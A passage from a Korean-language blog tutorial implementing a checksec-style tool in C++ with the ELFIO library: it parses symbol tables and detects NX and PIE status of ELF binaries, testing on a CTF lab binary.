        for(ELFIO::Elf_Half i = 0; i < reader.sections.size(); ++i)
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_SYMTAB == sec->get_type() || SHT_DYNSYM == sec->get_type())
            {
                ELFIO::symbol_section_accessor symbol(reader, sec);
                for(ELFIO::Elf_Xword i = 0; i < symbol.get_symbols_num(); ++i)
                {
                    std::string name;
                    ELFIO::Elf64_Addr value{0};
                    ELFIO::Elf_Xword  size{0};
                    unsigned char bind{0};
                    unsigned char type{0};
                    ELFIO::Elf_Half section{0};
                    unsigned char other{0};
                    symbol.get_symbol(i, name, value, size, bind, type, section, other);
                    if(!name.empty())
                    {
                        symbols.emplace(name, value);
                    }
                }
            }
        }   // end of for
    }

};

int main()
{
    try
    {
        ELF e{"/tmp/hitcon/LAB/lab4/ret2lib"};
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```

![full](/assets/images/stack.png)



<br>
## **NX**

NX bit의 활성화 여부는 segment들 중 GNU_STACK 형식의 Flag를 보고 알 수 있다. 만약 Flag의 permission이 RWX가 아닐 경우 NX bit가 활성화된 것이다.

```cpp
std::string get_nx()
{
    std::string nxbit{"NX disabled"};
    for(ELFIO::Elf_Half i = 0; i < reader.segments.size(); ++i)
    {
        ELFIO::segment *seg = reader.segments[i];
        if(PT_GNU_STACK == seg->get_type() && 7 != seg->get_flags())
        {
            nxbit = "NX enabled";
            break;
        }
    }
    return nxbit;
}
```

<br>
이제 NX 결과까지 출력해보자. 아래는 main 함수에서 출력을 추가하고 함수 get_nx()를 추가한 코드 및 그 실행 결과이다.

![full](/assets/images/nx.png)


<br>
## **PIE**

PIE는 아래 규칙으로 알아낼 수 있다.

![full](/assets/images/bpsec.png)

출처: [https://bpsecblog.wordpress.com/2016/06/28/memory_protect_linux_5/](https://bpsecblog.wordpress.com/2016/06/28/memory_protect_linux_5/)

<br>
ELF File Format의 Type은 아래의 코드로 알아낼 수 있다.

```cpp
if(ET_EXEC == reader.get_type()){pie = "No PIE";}
else {pie = "Not ELF file";}
```

<br>
Dynamic Section을 탐색하는 것은 이전 Relro에서 사용한 방법과 동일하며, tag 값을 확인하는 부분만 다르다.

```cpp
std::string get_pie()
{
    std::string pie;

    if(ET_EXEC == reader.get_type()){pie = "No PIE";}
    else {pie = "Not ELF file";}

    // search dynamic sections
    bool find{false};
    for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
    {
        ELFIO::section* sec = reader.sections[i];
        if(SHT_DYNAMIC == sec->get_type())
        {
            find = true;
            ELFIO::dynamic_section_accessor dynamic(reader, sec);
            for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
            {
                ELFIO::Elf_Xword tag{0};
                ELFIO::Elf_Xword value{0};
                std::string str;
                dynamic.get_entry(i, tag, value, str);
                if(DT_DEBUG == tag)
                {
                    if(ET_DYN == reader.get_type())
                    {
                        pie = "PIE enabled";
                    }
                }
            }
        }
    }
    if(!find)
    {
        if(ET_DYN == reader.get_type())
        {
            pie = "DSO";
        }
    }
    return pie;
}
```

<br>
아래는 지금까지 구현된 모든 코드들을 실행한 결과이다.

![full](/assets/images/pie.png)

